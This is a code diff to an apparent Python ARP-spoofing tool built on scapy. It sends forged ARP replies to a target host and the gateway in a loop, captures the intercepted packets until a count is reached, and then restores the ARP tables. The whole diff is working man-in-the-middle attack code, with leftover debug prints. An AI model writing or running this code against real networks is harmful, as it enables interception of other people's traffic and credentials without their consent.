@@ -7,7 +7,8 @@ import capture
 
 import time
 
-
+ip_gateway = ""
+ip_target = ""
 
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
@@ -23,23 +24,36 @@ def restore(destination_ip, source_ip):
 
 
 
-def algo(ip):
+def algo(mac,ip,a):
     interval = 4
     ip_target = ip
     ip_gateway = dr.router()
-    restore(ip_gateway, ip_target)
-    restore(ip_target, ip_gateway)
+    
     packets = ""
+    count = 0
     try:
-        packets = capture.start(ip_target)
+        print("here__1")
+        
+        print("here_2")
+        i = 1
         while True:
+          
           spoof(ip_target, ip_gateway)
           spoof(ip_gateway, ip_target)
+          print(len(packets))
+          if(count == 0):
+              packets = capture.start(mac,ip,a)
+              count = 1
+          elif(len(packets) == a):
+              restore(ip_gateway, ip_target)
+              restore(ip_target, ip_gateway)
+              break
           time.sleep(interval)
+          
           
     except KeyboardInterrupt:
         restore(ip_gateway, ip_target)
         restore(ip_target, ip_gateway)
-        capture.store(packets)
+        #capture.store(packets)
 
 
